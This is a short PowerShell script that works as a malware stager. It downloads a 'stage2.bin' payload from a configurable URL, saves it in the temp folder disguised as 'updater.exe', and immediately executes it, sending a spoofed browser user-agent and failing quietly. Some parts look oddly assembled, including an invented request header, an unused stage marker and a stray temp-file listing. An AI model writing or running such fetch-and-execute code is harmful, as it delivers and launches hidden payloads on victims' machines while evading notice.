[CmdletBinding()]
param(
    [string]$TargetUrl = "https://127.0.0.1:443/stage2.bin",
    [string]$OutputPath = "$env:TEMP\updater.exe",
    [int]$StageTimeout = 176,
    [string]$RequestAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
)
$ErrorActionPreference = "Stop"

function Invoke-Stage2Download {
    [CmdletBinding()]
    param(
        [string]$SourceUrl = '',
        [string]$DestinationPath = "",
        [int]$TimeoutSec = 45,
        [string]$UserAgent = "Mozilla/5.0"
    )

    Write-Verbose ("Requesting " + $SourceUrl)
    $ClientObject = New-Object System.Net.WebClient
    $ClientObject.Headers.Add("User-Agent", $UserAgent)
    $ClientObject.Headers.Add("X-Transfer-Timeout", [string]$TimeoutSec)
    $ClientObject.DownloadFile($SourceUrl, $DestinationPath)
    return (Test-Path -Path $DestinationPath)
}

try {
    Write-Verbose "Starting stage 2 transfer"
    $TransferResult = Invoke-Stage2Download -SourceUrl $TargetUrl -DestinationPath $OutputPath -TimeoutSec $StageTimeout -UserAgent $RequestAgent
    if ($TransferResult) {
        Start-Process -FilePath $OutputPath
    }
}
catch {
    Write-Warning "Stage 2 transfer failed: $($_.Exception.Message)"
}

$StageMarker = "stage-44"
Get-ChildItem -Path $env:TEMP -Filter "*.tmp" | Select-Object -First 3
